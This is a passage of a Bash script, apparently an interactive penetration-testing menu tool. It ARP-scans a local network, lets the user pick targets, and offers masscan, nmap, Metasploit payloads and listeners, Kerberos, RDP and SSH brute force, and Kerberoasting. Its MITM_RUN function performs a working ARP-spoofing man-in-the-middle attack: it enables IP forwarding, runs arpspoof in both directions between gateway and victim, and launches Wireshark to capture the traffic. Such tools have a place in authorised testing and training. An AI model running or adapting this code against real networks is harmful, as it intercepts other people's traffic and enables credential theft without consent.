			echo -e "${Light_Purple}[*]${NC} Performing scans on ${Green}$(echo $LAN_IP_TARGET)${NC}${Cyan}$(echo $CIDR_TARGET)${NC} (16777216 Hosts) will be slow."
			#gets user to confirm selection for choice of CIDR $CIDR_CONFIRM
			CIDR_USER_CONFIRM $CIDR_TARGET
			CIDR_TARGET_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN) 
			#get user input for the LAN IP address to inspect
			LAN_IP_MENU
			CIDR_TARGET_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT)
			exit
			shift
			;;
			*) 
			echo -e "\n${Light_Red}[!]${NC} Please enter '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}3${NC}', '${Orange}4${NC}', '${Orange}R${NC}' or '${Orange}Q${NC}'.\n"
			shift
			;;
		esac
	done
}

#gets user to confirm selection for choice of CIDR $CIDR_CONFIRM
function CIDR_USER_CONFIRM {
	#assign checker variable for while loop
	CIDR_CONFIRM_CHECKER=0
	while [ "$CIDR_CONFIRM_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Confirm using ${Cyan}$(echo $CIDR_TARGET)${NC} (y/n)? "
		read CIDR_CONFIRM
		case $CIDR_CONFIRM in
			y | Y | yes | Yes | YES)
			#fetch a list of arp-scan ip addresses and save it to a file
			ARP_SCAN
			#present the scan/attack menu to the user
			ATTACK_MENU
			CIDR_CONFIRM_CHECKER=1
			shift
			;;
			n | N | no | No | NO)
			#allows user to choose the CIDR notation 
			CHOOSE_CIDR
			CIDR_CONFIRM_CHECKER=1
			shift
			;;
			*)
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'.\n"
			shift
			;;
		esac
	done
}

#fetch a list of arp-scan ip addresses and save it to a file
function ARP_SCAN {
	#assign variable for date + time
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign arp-scan IP filename
	ARP_FILENAME=$LAN_IP_TARGET"-"$DATE_TIME.ip
	echo -e "\n${Light_Purple}[-]${NC} Executing Arp scanning. Please be patient...\n"
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "${Light_Purple}arp-scan${NC} ${Green}$(echo $LAN_IP_TARGET)${NC}${Cyan}$(echo $CIDR_TARGET)${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "${White}[*]${NC} Host(s) detected for ${Green}$(echo $LAN_IP_TARGET)${NC}${Cyan}$CIDR_TARGET${NC}:" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#access $ARP_DIR_PATH to store files generated by the script
	cd $ARP_DIR_PATH
	arp-scan $LAN_IP_TARGET$CIDR_TARGET | grep -E '^([0-9]{1,3}\.){3}[0-9]{1,3}' | awk -F " " '{print $1, $2}' > $ARP_FILENAME
	#validate if $ARP_FILENAME file exists
	if [ -f "$ARP_FILENAME" ]; then
		#validate if filesize is not greater than zero
		if [ ! -s "$ARP_FILENAME" ]; then
			echo -e "${Light_Red}[!]${NC} No hosts detected. Please choose another target." | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#reset checker variables to 0 before returning to the main menu
			SINGLE_TARGET_CHECKER=0
			NETWORK_TARGET_CHECKER=0
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
		else
			#assign counter variable
			ARP_IP_COUNTER=1
			#output $ARP_FILENAME to user
			while read arp_ip
			do
				#output ip addresses that are not the same as the default gateway
				if [ "$(echo $arp_ip | awk -F ' ' '{print $1}')" != "$DEFAULT_GATEWAY" ]; then
					echo -e "[$(echo $ARP_IP_COUNTER)] $(echo $arp_ip | awk -F ' ' '{print $1}')" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
					let ARP_IP_COUNTER+=1
				fi
			done < $ARP_FILENAME
			#display the path of saved files to the user
			echo "File Saved: $(echo $ARP_DIR_PATH)/$(echo $ARP_FILENAME)" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
		fi
	else
		echo -e "${Light_Red}[!]${NC} $ARP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#allows user to choose if he/she wants to use the previously saved data
function ARP_HISTORY {
	#access $ARP_DIR_PATH
	cd $ARP_DIR_PATH
	#list the most recent file that matches with the string $LAN_IP_TARGET
	ARP_RECORD=$(ls -lArt | grep $(echo $LAN_IP_TARGET) | awk '{if ($5 != 0) print $9}' | tail -n 1)
	#validate if default gatewawwy mac address is inside saved record
	if [ ! -z "$ARP_RECORD" ]; then
		DG_MAC_EXIST=$(grep $DEFAULT_GATEWAY_MAC $ARP_RECORD)
	fi
	#validate if $ARP_RECORD or $DG_MAC_EXIST is not empty
	if [ ! -z "$ARP_RECORD" ] && [ ! -z "$DG_MAC_EXIST" ]; then 
		echo
		echo -e "${Light_Purple}---------------------------------${NC}"
		echo -e "${White}MOST RECENT ${Light_Cyan}ARP-SCAN${NC} ${White}SAVED RECORD${NC}"
		echo -e "${Light_Purple}---------------------------------${NC}"
		echo -e "${Light_Purple}[*]${NC} File Name: $(echo $ARP_RECORD)"
		echo -e "${Light_Purple}[*]${NC} Date/Time: $(echo $ARP_RECORD | awk -F 'D' '{print $2}' | awk -F 'T' '{print $1}') $(echo $ARP_RECORD | awk -F 'T' '{print $2}' | awk -F 'Z' '{print $1}')UTC"
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Previous Options"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		echo -e "${Light_Purple}---------------------------------${NC}"
		#assign checker variable for while loop
		ARP_RECORD_CHECKER=0
		while [ "$ARP_RECORD_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Do you want to use the most recent record for ${Green}$(echo $LAN_IP_TARGET)${NC} (y/n)? "
			read ARP_RECORD_CONFIRM
			case $ARP_RECORD_CONFIRM in
				y | Y | yes | Yes | YES)
				#validate if $RECORD_OUTPUT file exists and output it to user, take in 1 argument $1
				RECORD_OUTPUT $ARP_RECORD
				#assign $ARP_RECORD filename to $ARP_FILENAME
				ARP_FILENAME=$ARP_RECORD
				#present the scan/attack menu to the user
				ATTACK_MENU
				ARP_RECORD_CHECKER=1
				shift
				;;
				n | N | no | No | NO)
				ARP_RECORD_CHECKER=2
				shift
				;;
				r | R | return | Return | RETURN) 
				#reset checker variables to 0 before returning to the main menu
				SINGLE_TARGET_CHECKER=0
				NETWORK_TARGET_CHECKER=0
				#presents to user the main menu to choose a single target or to scan for a local area network
				MAIN_MENU
				ARP_RECORD_CHECKER=1
				shift
				;;
				b | B | back | Back | BACK)
				#get user input for the LAN IP address to inspect
				LAN_IP_MENU
				ARP_RECORD_CHECKER=1
				shift
				;;
				q | Q | quit | Quit | QUIT)
				exit
				shift
				;;
				*)
				echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}', '${Orange}n${NC}', '${Orange}R${NC}', '${Orange}B${NC}' or '${Orange}Q${NC}'.\n"
				shift
				;;
			esac 
		done
	else
		ARP_RECORD_CHECKER=2
	fi
}

#validate if $RECORD_OUTPUT file exists and output it to user, take in 1 argument $1
function RECORD_OUTPUT {
	OUTPUT_FILENAME=$1
	#validates is $OUTPUT_FILENAME file exists
	if [ -f "$OUTPUT_FILENAME" ]; then
		#validate if filesize is not greater than zero
		if [ ! -s "$OUTPUT_FILENAME" ]; then
			echo -e "${Light_Red}[!]${NC} No hosts detected. Please choose another target."
			#reset checker variables to 0 before returning to the main menu
			SINGLE_TARGET_CHECKER=0
			NETWORK_TARGET_CHECKER=0
			MAIN_MENU
		else
			#assign counter variable
			OUTPUT_COUNTER=1
			echo -e "\n${White}[*]${NC} Previously detected host(s) for ${Green}$(echo $LAN_IP_TARGET)${NC}:"
			#output $OUTPUT_FILENAME to user
			while read output_ip
			do
				#output ip addresses that are not the same as the default gateway
				if [ "$(echo $output_ip | awk -F ' ' '{print $1}')" != "$DEFAULT_GATEWAY" ]; then
					echo -e "[$(echo $OUTPUT_COUNTER)] $(echo $output_ip | awk -F ' ' '{print $1}')"
					let OUTPUT_COUNTER+=1
				fi
			done < $OUTPUT_FILENAME
		fi
	else
		echo -e "${Light_Red}[!]${NC} $OUTPUT_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#present the scan/attack menu to the user
function ATTACK_MENU {
	echo
	echo -e "${Light_Purple}--------------------------${NC}"
	echo -e "${White}${Light_Cyan}SCANNING${NC} ${White}/${NC} ${Light_Cyan}CYBER ATTACK${NC} ${White}MENU${NC}"
	echo -e "${Light_Purple}--------------------------${NC}"
	echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} Masscan Scanning"
	echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} Nmap Scanning"
	echo -e "${Light_Purple}--------------------------${NC}"
	echo -e "${Light_Purple}[${Orange}3${NC}${Light_Purple}]${NC} Msfvenom Payload"
	echo -e "${Light_Purple}[${Orange}4${NC}${Light_Purple}]${NC} Msfconsole Listener"
	echo -e "${Light_Purple}--------------------------${NC}"
	echo -e "${Light_Purple}[${Orange}5${NC}${Light_Purple}]${NC} Man-in-The-Middle Attack"
	echo -e "${Light_Purple}[${Orange}6${NC}${Light_Purple}]${NC} Kerberos Bruteforce Attack"
	echo -e "${Light_Purple}[${Orange}7${NC}${Light_Purple}]${NC} Hashcat Kerberoasting"
	echo -e "${Light_Purple}[${Orange}8${NC}${Light_Purple}]${NC} Remote Desktop Protocol Attack"
	echo -e "${Light_Purple}[${Orange}9${NC}${Light_Purple}]${NC} SSH Bruteforce Attack"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn to Main Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}--------------------------${NC}"
	#assign main menu checker variable
	ATTACK_MENU_CHECKER=0
	while [ "$ATTACK_MENU_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Enter '${Orange}1${NC}' to '${Orange}9${NC}', '${Orange}R${NC}' or '${Orange}Q${NC}': "
		read ATTACK_MENU_CHOICE
		case $ATTACK_MENU_CHOICE in
			1 )
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
				#presents Masscan Menu to the user
				MASSCAN_MENU
			fi
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				#allows user to choose if he/she wants to use the previously saved data
				MASSCAN_HISTORY
				#allow user to choose masscan port range
				MASSCAN_SELECT_PORTS
			fi
			ATTACK_MENU_CHECKER=1
			shift
			;;
			2)
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
				#presents Nmap Menu to the user
				NMAP_MENU
				#allow user to choose nmap port range
				NMAP_SELECT_PORTS
			fi
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				#allows user to choose if he/she wants to import masscan saved data
				NMAP_IMPORT_MASSCAN_HISTORY
				#allows user to choose if he/she wants to import nmap saved data
				NMAP_HISTORY_OPTIONS
				#allow user to choose nmap port range
				NMAP_SELECT_PORTS
			fi
			ATTACK_MENU_CHECKER=1
			shift
			;;
			3)
			ATTACK_MENU_MSFVENOM=1
			#get LPORT number from user to setup payload
			PAYLOAD_SETUP
			ATTACK_MENU_CHECKER=1
			shift
			;;
			4)
			ATTACK_MENU_MSFCONSOLE=1
			#create listener.rc and start msfconsole
			MSFCONSOLE_START
			#present the scan/attack menu to the user
			ATTACK_MENU
			ATTACK_MENU_CHECKER=1
			shift
			;;
			5)
			#presents MiTM Attack Menu to the user
			MITM_MENU
			ATTACK_MENU_CHECKER=1
			shift
			;;
			6)
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				#presents kerberos Bruteforce Attack menu to the user
				KERBEROS_BF_MENU
			fi
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
				#execute nmap scan for kerberos and save it to a file and allow user to select the target
				KERBEROS_BF_SUB
				#present the scan/attack menu to the user
				ATTACK_MENU
			fi
			ATTACK_MENU_CHECKER=1
			shift
			;;
			7)
			#assign variable when HASHCAT_SETUP is called from the ATTACK_MENU
			ATTACK_MENU_HASHCAT=1
			#execute hashcat using user's provided information
			HASHCAT_SETUP
			ATTACK_MENU_CHECKER=1
			shift
			;;
			8)
			#resets $ATTACK_MENU_MSFVENOM and $ATTACK_MENU_MSFVENOM
			ATTACK_MENU_MSFVENOM=0
			ATTACK_MENU_MSFCONSOLE=0
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				#presents remote desktop protocol Attack menu to the user
				RDP_MENU
			fi
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
				#execute nmap scan for RDP and save it to a file and allow user to select the target
				RDP_SUB
				#present the scan/attack menu to the user
				ATTACK_MENU
			fi
			ATTACK_MENU_CHECKER=1
			shift
			;;
			9)
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				#presents SSH Bruteforce Attack menu to the user
				SSH_BF_MENU
			fi
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
				#presents SSH Bruteforce Attack menu to the user
				SSH_BF_SUB
			fi
			ATTACK_MENU_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN )
			#reset checker variables to 0 before returning to the main menu
			SINGLE_TARGET_CHECKER=0
			NETWORK_TARGET_CHECKER=0
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			ATTACK_MENU_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT )
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift
			;;
		esac
	done
}

#presents MiTM Attack Menu to the user
function MITM_MENU {
	echo
	echo -e "${Light_Purple}----------------${NC}"
	echo -e "${White}MiTM ATTACK MENU${NC}"
	echo -e "${Light_Purple}----------------${NC}"
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}elect Target"
	fi
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		echo -e "${Light_Purple}[*]${NC} Target IP Address: ${Green}$LAN_IP_TARGET${NC}"
		echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}tart MiTM Attack"
	fi
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}----------------${NC}"
	#assign while loop checker variable
	MITM_MENU_CHECKER=0
	while [ "$MITM_MENU_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}S${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
		read MITM_MENU_CHOICE
		case $MITM_MENU_CHOICE in
			s | S | select | Select | SELECT | start | Start | START)
			#list out the arp ip address for the user to select the target
			MITM_SUB
			MITM_MENU_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN)
			#reset checker variables to 0 before returning to the main menu
			SINGLE_TARGET_CHECKER=0
			NETWORK_TARGET_CHECKER=0
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			MITM_MENU_CHECKER=1
			shift
			;;
			g | G | go | Go | GO)
			#present the scan/attack menu to the user
			ATTACK_MENU
			MITM_MENU_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT)
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift 
			;;
		esac
	done
}

#list out the arp ip address for the user to select the target
function MITM_SUB {
	#change directory to $ARP_DIR_PATH
	cd $ARP_DIR_PATH
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]] ; then
		#assign single $LAN_IP_TARGET to $MITM_TARGET
		MITM_TARGET=$LAN_IP_TARGET
		#assign validation variable
		MITM_TARGET_VALID=$(arp-scan $MITM_TARGET | grep $MITM_TARGET | awk '{print $1}')
		#validate if $MITM_TARGET is detectable with arp-scan
		if [ ! -z "$MITM_TARGET_VALID" ]; then
			#execute MiTM Attack on the selected target
			MITM_RUN
			#execute wireshark
			WIRESHARK_RUN
		else
			#assign session time to variable
			DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
			echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "${Light_Purple}Man-in-The-Middle Attack${NC} ${Green}$(echo $MITM_TARGET)${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "${Light_Red}[!]${NC} Selected host is not detected." | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#get user input for the LAN IP address to inspect
			LAN_IP_MENU
		fi
	fi
	#validate if $ARP_FILENAME file exists and if user selected network scan
	if [ -f "$ARP_FILENAME" ] && [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		echo -e "\n${White}[*] Host(s) Detected:${NC}"
		#output $ARP_FILENAME list of IP addresses to user
		while read arp_list
		do
			#output ip addresses that are not the same as the default gateway
			if [ "$(echo $arp_list | awk -F ' ' '{print $1}')" != "$DEFAULT_GATEWAY" ]; then
				echo -e "${Light_Purple}[*]${NC} ${Green}$(echo $arp_list | awk -F ' ' '{print $1}')${NC}"
			fi
		done < $ARP_FILENAME
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To MiTM Attack Menu"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		#assign checker variable for while loop
		MITM_TARGET_CHECKER=0
		while [ "$MITM_TARGET_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Enter your target: "
			read MITM_TARGET
			#validate if $MITM_TARGET is empty
			if [ -z "$MITM_TARGET" ]; then
				echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
			else
				#validate if $MITM_Target exist in $ARP_FILENAME
				if [ ! -z "$(cat $ARP_FILENAME | awk '{print $1}' | grep -Fx $MITM_TARGET)" ]; then
					#execute MiTM Attack on the selected target
					MITM_RUN
					#execute wireshark
					WIRESHARK_RUN
					MITM_TARGET_CHECKER=1
				elif [ "$MITM_TARGET" == "R" ] || [ "$MITM_TARGET" == "r" ] || [ "$MITM_TARGET" == "return" ] || [ "$MITM_TARGET" == "Return" ] || [ "$MITM_TARGET" == "RETURN" ]; then
					#resets $MITM_TARGET
					MITM_TARGET=''
					#reset checker variables to 0 before returning to the main menu
					SINGLE_TARGET_CHECKER=0
					NETWORK_TARGET_CHECKER=0
					#presents to user the main menu to choose a single target or to scan for a local area network
					MAIN_MENU
					MITM_TARGET_CHECKER=1
				elif [ "$MITM_TARGET" == "B" ] || [ "$MITM_TARGET" == "b" ] || [ "$MITM_TARGET" == "back" ] || [ "$MITM_TARGET" == "Back" ] || [ "$MITM_TARGET" == "BACK" ]; then
					#resets $MITM_TARGET
					MITM_TARGET=''
					#presents MiTM Attack Menu to the user
					MITM_MENU
					MITM_TARGET_CHECKER=1
				elif [ "$MITM_TARGET" == "Q" ] || [ "$MITM_TARGET" == "q" ] || [ "$MITM_TARGET" == "quit" ] || [ "$MITM_TARGET" == "Quit" ] || [ "$MITM_TARGET" == "QUIT" ]; then
					exit
					MITM_TARGET_CHECKER=1
				else
					echo -e "${Light_Red}[!]${NC} Please choose the target only from the list. Enter '${Orange}R${NC}'eturn, '${Orange}B${NC}'ack or '${Orange}Q${NC}'uit."
				fi
			fi	
		done
	else
		echo -e "${Light_Red}[!]${NC} $ARP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#execute MiTM Attack on the selected target
function MITM_RUN {
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "${Light_Purple}Man-in-The-Middle Attack${NC} ${Green}$(echo $MITM_TARGET)${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo '1'> /proc/sys/net/ipv4/ip_forward
	xterm -e bash -c "arpspoof -t $DEFAULT_GATEWAY $MITM_TARGET" & 
	xterm -e bash -c "arpspoof -t $MITM_TARGET $DEFAULT_GATEWAY" &
	echo -e "\n${Light_Purple}[-]${NC} Successfully executed MiTM Attack!"
}

#execute wireshark
function WIRESHARK_RUN {
	#assign checker variable for while loop
	WIRESHARK_RUN_CHECKER=0
	while [ "$WIRESHARK_RUN_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Run Wireshark? (y/n) "
		read WIRESHARK_RUN
		case $WIRESHARK_RUN in 
			y | Y | yes | Yes | YES )
			#assign session time to variable
			DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
			echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "${Light_Purple}wireshark${NC} ${Green}$(echo $MITM_TARGET)${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			xterm -e bash -c wireshark &
			#presents MiTM Attack Menu to the user
			MITM_MENU
			WIRESHARK_RUN_CHECKER=1
			shift
			;;
			n | N | no | No | NO )
			#presents MiTM Attack Menu to the user
			MITM_MENU
			WIRESHARK_RUN_CHECKER=1
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift 
			;;
		esac
	done	
}

#presents Masscan Menu to the user
function MASSCAN_MENU {
	echo
	echo -e "${Light_Purple}------------${NC}"
	echo -e "${White}${Light_Cyan}MASSCAN${NC} ${White}MENU${NC}"
	echo -e "${Light_Purple}------------${NC}"
	echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}elect Target"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}------------${NC}"
	#assign checker variable for while loop
	MASSCAN_MENU_CHECKER=0
	while [ "$MASSCAN_MENU_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}S${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
		read MASSCAN_MENU_CHOICE
		case $MASSCAN_MENU_CHOICE in
			s | S | select | Select | SELECT)
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				#get user input for the LAN IP address to inspect
				LAN_IP_MENU
			fi
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
				#list out the arp ip address for the user to select the target
				MASSCAN_SELECT_TARGET
			fi
			MASSCAN_MENU_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN)
			#reset checker variables to 0 before returning to the main menu
			SINGLE_TARGET_CHECKER=0
			NETWORK_TARGET_CHECKER=0
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			MASSCAN_MENU_CHECKER=1
			shift
			;;
			g | g | go | Go | GO)
			#present the scan/attack menu to the user
			ATTACK_MENU
			MASSCAN_MENU_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT)
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift 
			;;
		esac
	done
}

#list out the arp ip address for the user to select the target
function MASSCAN_SELECT_TARGET {
	#change directory to $ARP_DIR_PATH
	cd $ARP_DIR_PATH
	#validate if $ARP_FILENAME file exists
	if [ -f "$ARP_FILENAME" ]; then
		echo -e "\n${White}[*] Host(s) Detected:${NC}"
		#output $ARP_FILENAME list of IP addresses to user
		while read arp_list
		do
			#output ip addresses that are not the same as the default gateway
			if [ "$(echo $arp_list | awk -F ' ' '{print $1}')" != "$DEFAULT_GATEWAY" ]; then
				echo -e "${Light_Purple}[*]${NC} ${Green}$(echo $arp_list | awk -F ' ' '{print $1}')${NC}"
			fi
		done < $ARP_FILENAME
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Masscan Menu"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		#assign checker variable for while loop
		MASSCAN_TARGET_CHECKER=0
		while [ "$MASSCAN_TARGET_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Enter your target: "
			read MASSCAN_TARGET
			#validate if $MASSCAN_TARGET is empty
			if [ -z "$MASSCAN_TARGET" ]; then
				echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
			else
				#validate if $MASSCAN_TARGET exist in $ARP_FILENAME
				if [ ! -z "$(cat $ARP_FILENAME | awk '{print $1}' | grep -Fx $MASSCAN_TARGET)" ]; then
					#allows user to choose if he/she wants to use the previously saved data
					MASSCAN_HISTORY
					if [ "$MASSCAN_RECORD_CHECKER" -eq 2 ]; then
						#allow user to choose masscan port range
						MASSCAN_SELECT_PORTS
					fi
					MASSCAN_TARGET_CHECKER=1
				elif [ "$MASSCAN_TARGET" == "R" ] || [ "$MASSCAN_TARGET" == "r" ] || [ "$MASSCAN_TARGET" == "return" ] || [ "$MASSCAN_TARGET" == "Return" ] || [ "$MASSCAN_TARGET" == "RETURN" ]; then
					#resets $MASSCAN_TARGET
					MASSCAN_TARGET=''
					#reset checker variables to 0 before returning to the main menu
					SINGLE_TARGET_CHECKER=0
					NETWORK_TARGET_CHECKER=0
					#presents to user the main menu to choose a single target or to scan for a local area network
					MAIN_MENU
					MASSCAN_TARGET_CHECKER=1
				elif [ "$MASSCAN_TARGET" == "B" ] || [ "$MASSCAN_TARGET" == "b" ] || [ "$MASSCAN_TARGET" == "back" ] || [ "$MASSCAN_TARGET" == "Back" ] || [ "$MASSCAN_TARGET" == "BACK" ]; then
					#resets $MASSCAN_TARGET
					MASSCAN_TARGET=''
					#presents Masscan Menu to the user
					MASSCAN_MENU
					MASSCAN_TARGET_CHECKER=1
				elif [ "$MASSCAN_TARGET" == "Q" ] || [ "$MASSCAN_TARGET" == "q" ] || [ "$MASSCAN_TARGET" == "quit" ] || [ "$MASSCAN_TARGET" == "Quit" ] || [ "$MASSCAN_TARGET" == "QUIT" ]; then
					exit
					MASSCAN_TARGET_CHECKER=1
				else
					echo -e "${Light_Red}[!]${NC} Please choose the target only from the list. Enter '${Orange}R${NC}'eturn, '${Orange}B${NC}'ack or '${Orange}Q${NC}'uit.\n"
				fi
			fi	
		done
	else
		#validate if user selected single target scan
		if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
			#get user input for the LAN IP address to inspect
			LAN_IP_MENU
		fi
			echo -e "${Light_Red}[!]${NC} $ARP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#allow user to choose masscan port range
function MASSCAN_SELECT_PORTS {
	echo -e "\n${Light_Purple}[*]${NC} Target IP Address: ${Green}$MASSCAN_TARGET${NC}"
	echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} Scan All Ports ${Cyan}0-65535${NC}"
	echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} Enter A Range Of Ports"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Masscan Menu"
	echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Select Target"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	#assign checker variable for while loop
	MASSCAN_TARGET_CHECKER=0
	while [ "$MASSCAN_TARGET_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please choose '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}R${NC}', '${Orange}B${NC}', or '${Orange}Q${NC}' "
		read MASSCAN_PORTS
		case $MASSCAN_PORTS in
			1 )
			MASSCAN_PORTS='0-65535'
			#allow user to enter masscan rate
			MASSCAN_RATE_SELECT
			#allow user to enter number of retries
			MASSCAN_RETRIES_SELECT
